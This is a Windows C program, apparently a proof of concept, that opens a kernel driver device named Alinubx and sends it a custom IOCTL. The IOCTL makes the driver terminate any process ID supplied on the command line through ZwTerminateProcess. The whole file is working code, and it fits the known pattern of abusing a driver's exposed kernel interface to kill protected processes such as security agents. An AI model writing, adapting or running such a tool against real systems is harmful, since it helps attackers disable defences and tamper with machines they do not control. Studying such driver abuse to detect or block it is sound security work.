#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define ALINUBX_DEVICE_PATH     L"\\\\.\\Alinubx"
#define IOCTL_ALINUBX_TERMINATE 0x222024

typedef struct _ALINUBX_TERMINATE_INPUT {
    DWORD ProcessId;
    DWORD ExitStatus;
} ALINUBX_TERMINATE_INPUT;

static void PrintWin32Error(const char *context)
{
    DWORD error = GetLastError();
    LPSTR message = NULL;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&message,
        0,
        NULL);

    if (message != NULL) {
        fprintf(stderr, "[-] %s failed: error %lu (%s)", context, error, message);
        LocalFree(message);
    } else {
        fprintf(stderr, "[-] %s failed: error %lu\n", context, error);
    }

    if (error == ERROR_FILE_NOT_FOUND) {
        fprintf(stderr, "[!] Hint: driver may not be loaded or device path is wrong.\n");
    }
}

static HANDLE OpenAlinubxDevice(void)
{
    HANDLE device = CreateFileW(
        ALINUBX_DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (device == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW");
    }

    return device;
}

static BOOL AlinubxSendTerminateIoctl(HANDLE device, DWORD pid, DWORD exitStatus)
{
    ALINUBX_TERMINATE_INPUT input;
    DWORD bytesReturned = 0;
    BOOL ok;

    input.ProcessId = pid;
    input.ExitStatus = exitStatus;

    ok = DeviceIoControl(
        device,
        IOCTL_ALINUBX_TERMINATE,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL);

    if (!ok) {
        PrintWin32Error("DeviceIoControl");
    }

    return ok;
}

static void PrintUsage(const char *programName)
{
    fprintf(stderr, "Usage: %s <pid> [exit_status]\n", programName);
    fprintf(stderr, "  pid          Target process ID (required)\n");
    fprintf(stderr, "  exit_status  NTSTATUS for ZwTerminateProcess (default: 0)\n");
}

int main(int argc, char *argv[])
{
    HANDLE device;
    unsigned long pid;
    unsigned long exitStatus = 0;
    char *end = NULL;

    if (argc < 2 || argc > 3) {
        PrintUsage(argv[0]);
        return 1;
    }

    pid = strtoul(argv[1], &end, 10);
    if (argv[1][0] == '\0' || (end != NULL && *end != '\0') || pid == 0) {
        fprintf(stderr, "[-] Invalid PID: %s\n", argv[1]);
        PrintUsage(argv[0]);
        return 1;
    }

    if (argc == 3) {
        exitStatus = strtoul(argv[2], &end, 10);
        if (argv[2][0] == '\0' || (end != NULL && *end != '\0')) {
            fprintf(stderr, "[-] Invalid exit status: %s\n", argv[2]);
            PrintUsage(argv[0]);
            return 1;
        }
    }

    device = OpenAlinubxDevice();
    if (device == INVALID_HANDLE_VALUE) {
        return 1;
    }

    printf("[*] Opened device %ls\n", ALINUBX_DEVICE_PATH);
    printf("[*] Sending IOCTL 0x%08lX for PID %lu (exit status %lu)\n",
           (unsigned long)IOCTL_ALINUBX_TERMINATE,
           pid,
           exitStatus);

    if (!AlinubxSendTerminateIoctl(device, (DWORD)pid, (DWORD)exitStatus)) {
        CloseHandle(device);
        return 1;
    }

    printf("[+] IOCTL completed successfully\n");
    CloseHandle(device);
    return 0;
}
